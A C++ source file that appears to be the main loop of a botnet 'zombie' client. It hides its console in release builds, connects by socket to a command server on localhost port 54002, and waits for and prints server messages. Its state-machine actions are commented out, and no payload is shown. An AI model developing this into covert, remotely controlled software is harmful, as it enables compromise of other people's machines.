#include "Client.h"
#include "Echo.h"
#include "Standby.h"

#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>

static std::condition_variable cv;
static std::mutex mutex;
static std::atomic<bool> arcvdMsg(false);
bool rcvdMsg = false;

void waitingForServerMsg(Client& zombie)
{
	while (true)
	{
		std::unique_lock<std::mutex> ul(mutex);
		arcvdMsg = zombie.receiveFromServer();
		std::cout << "thread2 rcv" << std::endl;
		cv.wait(ul, []() {return !arcvdMsg.load(); });
	}
}


int main()
{
#ifdef RELEASE
	FreeConsole();
#endif
	std::cout << "Init Zombie" << std::endl;

	Client Zombie;
	//initial state
	State* state = new Standby(Zombie);

	if (!Zombie.init())
		return 0;

	if (Zombie.createSocket())
	{
		if (Zombie.connectToSrv("127.0.0.1", 54002))
		{
			std::cout << "connected" << std::endl;
			std::thread worker(waitingForServerMsg, std::ref(Zombie));
			worker.detach();
			while (true)
			{
				if (arcvdMsg.load())
				{
					std::cout << "rcv" << std::endl;
					rcvdMsg = true;
					arcvdMsg = false;
					cv.notify_one();
				}
				if (rcvdMsg)
				{
					std::cout << Zombie.getSrvMsg() << std::endl;
					rcvdMsg = false;
				}
				//std::cout << "update" << std::endl;
				//state = state->update();
				//state->run();
			}
		}
		else
		{
			std::cout << "Couldnt connect to srv" << std::endl;
		}
	}
	else
	{
		std::cout << "Couldnt create Socket" << std::endl;
	}
	
	return 0;
}